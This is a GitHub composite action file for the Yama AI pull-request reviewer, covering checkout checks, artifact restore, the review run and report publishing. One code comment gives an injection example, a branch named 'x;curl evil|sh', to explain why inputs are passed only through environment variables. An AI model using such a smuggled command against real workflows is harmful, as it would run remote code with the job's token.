name: "Yama review"
description: "Pull request review that reads the checked-out repository, posts what it finds, and learns on merge."

# Two things this action depends on, both deliberate:
#
#  1. The repository must already be checked out. Yama reads the diff and the
#     code from disk rather than through the VCS API — that is why a run needs
#     tens of tool calls instead of hundreds.
#  2. `fetch-depth: 0` (or at least enough history to reach the base) — the
#     change set comes from `git diff base...head`.

inputs:
  pr:
    description: "Pull request number. Defaults to the triggering pull request."
    required: false
  branch:
    description: "Branch to review. Yama resolves its pull request; ambiguity is reported, never guessed."
    required: false
  config:
    description: "Config directory. Point it outside the checkout when reviewing untrusted pull requests."
    required: false
    default: ".yama"
  yama-version:
    description: >
      npm version range to install. Pinned to the major this action's inputs and
      config shape belong to: installing "latest" would silently run an older
      major against a v4 config, which fails in ways that look like a broken
      review rather than a version mismatch.
    required: false
    default: "^4.0.0"
  dry-run:
    description: "Analyse and report without posting anything."
    required: false
    default: "false"
  concurrency:
    description: "How much parallelism the agent may command: high | medium | low."
    required: false
    default: "medium"
  verdict:
    description: "Set false to review without an approve/block decision."
    required: false
    default: "true"
  checks:
    description: "Set false to skip configured checks for this run."
    required: false
    default: "true"
  vcs-token:
    description: >
      Token for the VCS MCP server. Pass it through a NON-reserved env name —
      ${{ secrets.GITHUB_TOKEN }} is unreliable inside a composite action.
    required: false
  fail-on-blocked:
    description: "Exit non-zero when the verdict is BLOCKED."
    required: false
    default: "true"
  node-version:
    description: "Node version."
    required: false
    default: "22"

# Every value here comes from the run report the CLI writes to
# .yama/reports/<runId>.json, read by the "Publish the run report" step below.
# They were previously bound to the review step, which writes nothing to
# $GITHUB_OUTPUT — so all six were permanently empty and `fail-on-blocked` could
# never fire, which made a blocked review indistinguishable from a clean one.
outputs:
  decision:
    description: "APPROVED | CHANGES_REQUESTED | BLOCKED"
    value: ${{ steps.report.outputs.decision }}
  posted:
    description: "Comments actually posted, counted from the posting tool's results."
    value: ${{ steps.report.outputs.posted }}
  critical:
    description: "Critical findings posted."
    value: ${{ steps.report.outputs.critical }}
  major:
    description: "Major findings posted."
    value: ${{ steps.report.outputs.major }}
  partial:
    description: "True when a stage did not complete — the review cannot vouch for the whole change."
    value: ${{ steps.report.outputs.partial }}
  summary:
    description: >
      The verdict and the reasons behind it. The summary COMMENT body lives on
      the pull request; the run report carries the decision and its reasons.
    value: ${{ steps.report.outputs.summary }}

runs:
  using: composite
  steps:
    - name: Verify the checkout
      shell: bash
      working-directory: ${{ github.workspace }}
      run: |
        set -euo pipefail
        if [ ! -d .git ]; then
          echo "::error::Yama needs the repository checked out. Add actions/checkout@v4 with fetch-depth: 0 before this step."
          exit 1
        fi
        # A shallow clone cannot reach the base commit, so the diff would be
        # wrong rather than absent — which is worse. Say so loudly.
        if [ "$(git rev-parse --is-shallow-repository)" = "true" ]; then
          echo "::warning::This is a shallow clone. Yama needs history to compute the diff against the base. Use fetch-depth: 0."
        fi

    - uses: actions/setup-node@v4
      with:
        node-version: ${{ inputs.node-version }}

    - name: Restore this pull request's artifact
      # Carries what earlier runs on this pull request established. Absent is
      # fine — comment markers still carry deduplication.
      #
      # Located through the API rather than with `actions/download-artifact`:
      # that action only sees artifacts from the CURRENT run, and the one needed
      # here was written by the PREVIOUS review of this pull request. Using it
      # restored nothing, silently, on every re-run.
      continue-on-error: true
      shell: bash
      env:
        GH_TOKEN: ${{ inputs.vcs-token }}
        PR_NUMBER: ${{ inputs.pr || github.event.pull_request.number }}
      run: |
        set -euo pipefail
        name="yama-pr-${PR_NUMBER}"
        id=$(gh api "repos/${{ github.repository }}/actions/artifacts?per_page=100" \
               --jq "[.artifacts[] | select(.name == \"$name\" and .expired == false)]
                     | sort_by(.created_at) | reverse | .[0].id // empty")
        if [ -z "$id" ]; then
          echo "No previous memory for this pull request — reviewing from comment markers."
          exit 0
        fi
        mkdir -p .yama/state
        gh api "repos/${{ github.repository }}/actions/artifacts/$id/zip" > /tmp/yama-memory.zip
        unzip -o -q /tmp/yama-memory.zip -d .yama/state
        echo "Restored memory from artifact $id."

    - name: Verify the setup
      shell: bash
      working-directory: ${{ github.workspace }}
      env:
        # Exported under both names on purpose. A capability map names the env
        # var it interpolates, and the two conventions in the wild are
        # ${YAMA_VCS_TOKEN} (provider-neutral) and ${YAMA_GITHUB_TOKEN} (what
        # this repo's reference .yama/mcp.yaml and yama-review.yml use). Exporting
        # one of them meant the other config style authenticated with an empty
        # string and failed at the first API call.
        YAMA_VCS_TOKEN: ${{ inputs.vcs-token }}
        YAMA_GITHUB_TOKEN: ${{ inputs.vcs-token }}
        YAMA_INPUT_DRY_RUN: ${{ inputs.dry-run }}
        YAMA_INPUT_VERSION: ${{ inputs.yama-version }}
      run: |
        set -euo pipefail
        # Everything expensive that can fail late is checked here instead:
        # connections, credentials, and every capability the run will need.
        DOCTOR_ARGS=(doctor)
        if [ "$YAMA_INPUT_DRY_RUN" != "true" ]; then DOCTOR_ARGS+=(--live); fi
        npx --yes "@juspay/yama@$YAMA_INPUT_VERSION" "${DOCTOR_ARGS[@]}"

    - name: Review
      id: review
      shell: bash
      working-directory: ${{ github.workspace }}
      env:
        # Both names — see the note on the previous step.
        YAMA_VCS_TOKEN: ${{ inputs.vcs-token }}
        YAMA_GITHUB_TOKEN: ${{ inputs.vcs-token }}
        YAMA_CONCURRENCY: ${{ inputs.concurrency }}
        YAMA_VERDICT: ${{ inputs.verdict }}
        YAMA_CHECKS: ${{ inputs.checks }}
        # Fork pull requests carry untrusted code. Check execution stays off for
        # them regardless of configuration — but only if the process can tell.
        # `isForkPullRequest` (src/v4/config/defaults.ts) decides by comparing the
        # head repository against the base one, so those are the two names that
        # have to arrive. GITHUB_HEAD_REPOSITORY is not a runner default and is
        # empty for a non-pull-request event, which the comparison handles.
        GITHUB_HEAD_REPOSITORY: ${{ github.event.pull_request.head.repo.full_name }}
        GITHUB_REPOSITORY: ${{ github.repository }}
        YAMA_INPUT_PR: ${{ inputs.pr }}
        YAMA_INPUT_BRANCH: ${{ inputs.branch }}
        YAMA_INPUT_DRY_RUN: ${{ inputs.dry-run }}
        YAMA_INPUT_CONFIG: ${{ inputs.config }}
        YAMA_INPUT_VERSION: ${{ inputs.yama-version }}
      run: |
        set -euo pipefail
        # Inputs reach the shell ONLY through environment variables, never by
        # template interpolation into this script. `inputs.branch` is routinely
        # wired to `github.head_ref`, which a fork controls — a branch named
        # `x;curl evil|sh` interpolated here would execute with the job's
        # token before Yama ever starts.
        ARGS=(review)
        if [ -n "$YAMA_INPUT_PR" ]; then ARGS+=(--pr "$YAMA_INPUT_PR"); fi
        if [ -n "$YAMA_INPUT_BRANCH" ]; then ARGS+=(--branch "$YAMA_INPUT_BRANCH"); fi
        if [ "$YAMA_INPUT_DRY_RUN" = "true" ]; then ARGS+=(--dry-run); fi
        ARGS+=(--config "$YAMA_INPUT_CONFIG")
        npx --yes "@juspay/yama@$YAMA_INPUT_VERSION" "${ARGS[@]}"

    - name: Publish the run report
      # The review writes .yama/reports/<runId>.json (writeRunReport, in
      # src/v4/core/RunReport.ts) and nothing else to $GITHUB_OUTPUT — so this
      # step is what turns a finished review into the action's outputs.
      #
      # `always()`: a review that failed part-way still wrote a report saying so,
      # and a caller that gates on `partial` needs to see it. A missing or
      # unreadable report yields empty outputs and a warning annotation, never a
      # failed step — the review already happened either way.
      id: report
      if: always()
      shell: bash
      working-directory: ${{ github.workspace }}
      run: |
        set -euo pipefail
        node -e '
          const fs = require("node:fs");
          const path = require("node:path");
          const out = { decision: "", posted: "", critical: "", major: "", partial: "", summary: "" };
          let report;
          try {
            const newest = fs
              .readdirSync(path.join(process.cwd(), ".yama", "reports"))
              .filter((name) => name.endsWith(".json"))
              .map((name) => path.join(process.cwd(), ".yama", "reports", name))
              .sort((a, b) => fs.statSync(b).mtimeMs - fs.statSync(a).mtimeMs)[0];
            if (newest) {
              report = JSON.parse(fs.readFileSync(newest, "utf8"));
              console.log("Run report: " + newest);
            } else {
              console.log("::warning::No run report under .yama/reports; outputs stay empty.");
            }
          } catch (error) {
            console.log("::warning::Could not read the run report: " + error.message);
          }
          if (report) {
            const bySeverity = report.bySeverity || {};
            const posted = Array.isArray(report.posted) ? report.posted.length : report.posted;
            const verdict = report.verdict || {};
            out.decision = report.decision || verdict.decision || "";
            out.posted = String(typeof posted === "number" ? posted : 0);
            out.critical = String(bySeverity.CRITICAL || 0);
            out.major = String(bySeverity.MAJOR || 0);
            out.partial = String(
              typeof report.partial === "boolean"
                ? report.partial
                : Boolean(report.stages && report.stages.partial),
            );
            out.summary = [
              "Verdict: " + (out.decision || "unknown"),
              ...(verdict.reasons || []).map((reason) => "- " + reason),
            ].join("\n");
          }
          try {
            const file = process.env.GITHUB_OUTPUT;
            const mark = "yama_eof_" + Math.random().toString(36).slice(2);
            const body = Object.entries(out)
              .map(([key, value]) => key + "<<" + mark + "\n" + value + "\n" + mark)
              .join("\n");
            if (file) { fs.appendFileSync(file, body + "\n"); }
          } catch (error) {
            console.log("::warning::Could not write step outputs: " + error.message);
          }
          console.log(
            "decision=" + out.decision + " posted=" + out.posted +
            " critical=" + out.critical + " major=" + out.major +
            " partial=" + out.partial,
          );
        '

    - name: Save this pull request's artifact
      if: always()
      continue-on-error: true
      uses: actions/upload-artifact@v4
      with:
        name: yama-pr-${{ inputs.pr || github.event.pull_request.number }}
        path: .yama/state
        retention-days: 30
        overwrite: true

    - name: Fail on a blocked verdict
      if: inputs.fail-on-blocked == 'true' && steps.report.outputs.decision == 'BLOCKED'
      shell: bash
      run: |
        echo "::error::Yama blocked this pull request. See the summary comment for why."
        exit 1
